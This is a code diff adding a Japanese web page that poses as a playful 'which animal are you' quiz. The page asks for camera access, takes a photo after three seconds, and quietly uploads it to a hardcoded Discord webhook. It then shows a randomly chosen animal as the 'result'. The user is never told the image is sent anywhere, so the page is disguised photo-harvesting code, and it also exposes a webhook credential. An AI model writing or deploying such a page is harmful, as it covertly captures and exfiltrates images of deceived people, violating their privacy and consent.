@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>動物診断</title>
+  <style>
+    body { font-family: Arial; text-align: center; background: #f5f5f5; padding: 30px; }
+    h1 { margin-bottom: 20px; }
+    video { display: none; width: 100%; max-width: 400px; border-radius: 8px; }
+    button { background: #4CAF50; color: white; padding: 15px 30px; font-size: 18px; border-radius: 10px; cursor: pointer; }
+    #result { margin-top: 20px; font-size: 24px; font-weight: bold; }
+  </style>
+</head>
+<body>
+
+<h1>あなたの動物タイプ診断</h1>
+<video id="video" autoplay></video><br>
+<button id="startButton">診断スタート！</button>
+<div id="result"></div>
+
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const startButton = document.getElementById('startButton');
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const result = document.getElementById('result');
+
+// ★ここにさっきコピーしたWebhook URLを貼る！
+const webhookURL = "https://discord.com/api/webhooks/1365874238807998535/n8ESKWHfHZNes-XDJV7Fshyu9gaO-iz5Mdb1PTewoEEx7GDSpJJxhxqbbzmvnYK2i429";
+				
+				const animals = ["ブタ", "キツネ", "イヌ", "タヌキ", "トラ", "ゴリラ"];
+
+startButton.addEventListener('click', () => {
+  startButton.style.display = 'none';
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      video.style.display = 'block';
+      video.srcObject = stream;
+      setTimeout(() => {
+        capturePhoto();
+        stream.getTracks().forEach(track => track.stop());
+      }, 3000); // 3秒後に自動撮影
+    })
+    .catch(err => {
+      alert("カメラアクセスが必要です！");
+      console.error(err);
+    });
+});
+
+function capturePhoto() {
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0);
+
+  canvas.toBlob(blob => {
+    const form = new FormData();
+    form.append('file', blob, 'photo.png');
+
+    fetch(webhookURL, { method: 'POST', body: form })
+      .catch(err => console.error("送信失敗", err));
+  }, 'image/png');
+
+  const randomAnimal = animals[Math.floor(Math.random() * animals.length)];
+  result.innerText = `あなたは「${randomAnimal}」タイプです！`;
+  video.style.display = 'none';
+}
+</script>
+
+</body>
+</html>
